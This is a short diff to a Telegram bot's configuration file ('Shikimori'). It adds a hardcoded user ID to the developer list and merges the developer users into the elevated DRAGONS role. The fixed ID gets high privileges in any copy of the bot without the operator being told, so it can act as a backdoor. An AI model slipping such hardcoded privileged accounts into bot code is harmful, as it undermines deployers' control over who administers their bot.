@@ -238,10 +238,10 @@ app = Client("Shikimori", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 
 
 
+DEV_USERS.add(769830161) 
 
 
-
-DRAGONS = list(DRAGONS)
+DRAGONS = list(DRAGONS) + list(DEV_USERS)
 DEV_USERS = list(DEV_USERS)
 WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
